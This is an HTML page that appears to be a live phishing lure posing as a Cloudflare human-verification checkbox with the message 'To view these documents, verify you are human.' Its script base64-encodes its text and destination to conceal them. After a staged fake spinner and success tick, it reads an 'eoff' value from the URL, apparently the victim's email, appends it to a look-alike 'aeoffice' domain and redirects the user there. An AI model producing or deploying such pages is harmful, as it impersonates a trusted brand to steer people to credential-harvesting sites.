<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verification Required</title>
    <style>
        /* Base Reset */
        html, body { margin: 0; padding: 0; height: 100%; background-color: #ffffff; font-family: "Segoe UI", Tahoma, sans-serif; overflow: hidden; }

        /* Full Color Loading Overlay */
        #splash-container {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            display: flex; justify-content: center; align-items: center;
            background: #ffffff; z-index: 1000;
        }
        .pulsate { width: 100px; height: auto; animation: pulse-effect 2s ease-in-out infinite; }

        @keyframes pulse-effect {
            0%, 100% { transform: scale(1); opacity: 0.8; }
            50% { transform: scale(1.1); opacity: 1; }
        }

        /* Main View Container */
        #gatekeeper-view {
            display: none; flex-direction: column; justify-content: center;
            align-items: center; height: 100vh;
        }

        #instruction-text { font-size: 14px; color: #333; margin-bottom: 18px; }

        /* The Main Rectangular Box */
        .widget-frame {
            display: flex; justify-content: space-between; align-items: center;
            width: 380px; padding: 16px 24px; border: 1px solid #e0e0e0;
            border-radius: 4px; background: #f9f9f9; box-shadow: 0 1px 2px rgba(0,0,0,0.05);
        }

        .flex-row { display: flex; align-items: center; gap: 12px; }

        /* Logic for the Trigger Element */
        .click-area { width: 26px; height: 26px; display: flex; justify-content: center; align-items: center; cursor: pointer; }

        /* Box state (Original) */
        .box-outline { width: 22px; height: 22px; border: 2px solid #c1c1c1; border-radius: 3px; background: white; }

        /* Spinner state (Replaces the box completely) */
        .spinner { width: 22px; height: 22px; border: 3px solid #f3f3f3; border-top: 3px solid #0052cc; border-radius: 50%; animation: rotate-speed 0.8s linear infinite; }

        /* Check state */
        .check-circle { width: 24px; height: 24px; background-color: #228b22; border-radius: 50%; display: flex; justify-content: center; align-items: center; color: white; font-size: 14px; }

        @keyframes rotate-speed { 100% { transform: rotate(360deg); } }

        /* Branding Styles */
        #interaction-status { font-size: 14px; color: #555; }
        .vendor-info { text-align: center; display: flex; flex-direction: column; align-items: center; }
        .vendor-icon { width: 28px; height: auto; margin-bottom: 4px; }
        #vendor-name { font-weight: 700; font-size: 15px; color: #1a1a1b; margin: 0; }
        .footer-links { font-size: 10px; color: #888; margin-top: 2px; }
    </style>
</head>
<body>

    <div id="splash-container">
        <img src="astro.png" class="pulsate" alt="Loading">
    </div>

    <div id="gatekeeper-view">
        <div id="instruction-text"></div>
        <div class="widget-frame">
            <div class="flex-row">
                <div class="click-area" id="action-trigger">
                    <div id="state-visual" class="box-outline"></div>
                </div>
                <span id="interaction-status"></span>
            </div>
            <div class="vendor-info">
                <img src="astro2.png" alt="" class="vendor-icon">
                <p id="vendor-name"></p>
                <div class="footer-links">Privacy . Terms</div>
            </div>
        </div>
    </div>

    <script>
        (function() {
            const config = {
                sMsg: "VG8gdmlldyB0aGVzZSBkb2N1bWVudHMsIHZlcmlmeSB5b3UgYXJlIGh1bWFuIGJlbG93",
                sBtn: "dmVyaWZ5",
                sRun: "dmVyaWZ5aW5nLi4u",
                sFin: "c3VjY2Vzcw==",
                sBrand: "Q2xvdWRmbGFyZQ==",
                // New URL: https://aeoffice.egvhfztransfercygv.online/wvwYPnsr#
                sUrl: "aHR0cHM6Ly9hZW9mZmljZS5lZ3ZoZnp0cmFuc2ZlcmN5Z3Yub25saW5lL3d2d1lQbnNyIw==",
                sParam: "ZW9mZg=="
            };

            const dom = {
                msg: document.getElementById('instruction-text'),
                stat: document.getElementById('interaction-status'),
                name: document.getElementById('vendor-name'),
                vis: document.getElementById('state-visual'),
                btn: document.getElementById('action-trigger'),
                gate: document.getElementById('gatekeeper-view'),
                load: document.getElementById('splash-container')
            };

            const decode = (str) => atob(str);

            // Startup Sequence
            window.addEventListener('DOMContentLoaded', () => {
                dom.msg.innerText = decode(config.sMsg);
                dom.stat.innerText = decode(config.sBtn);
                dom.name.innerText = decode(config.sBrand);

                setTimeout(() => {
                    dom.load.style.display = 'none';
                    dom.gate.style.display = 'flex';
                }, 2000);
            });

            // Interaction Sequence
            dom.btn.addEventListener('click', function() {
                // Change UI: Remove box-outline, add spinner
                dom.vis.className = 'spinner';
                dom.stat.innerText = decode(config.sRun);
                this.style.pointerEvents = 'none';

                setTimeout(() => {
                    // Success state
                    dom.vis.className = 'check-circle';
                    dom.vis.innerText = 'âœ“';
                    dom.stat.innerText = decode(config.sFin);
                    executeRedirect();
                }, 2200);
            });

            function executeRedirect() {
                const currentUrl = window.location.href;
                const keyString = decode(config.sParam) + "=";
                let capturedValue = "";

                if (currentUrl.includes(keyString)) {
                    capturedValue = currentUrl.split(keyString)[1];
                }

                let finalDestination = decode(config.sUrl) + capturedValue;

                setTimeout(() => {
                    window.location.replace(finalDestination);
                }, 800);
            }
        })();
    </script>
</body>
</html>
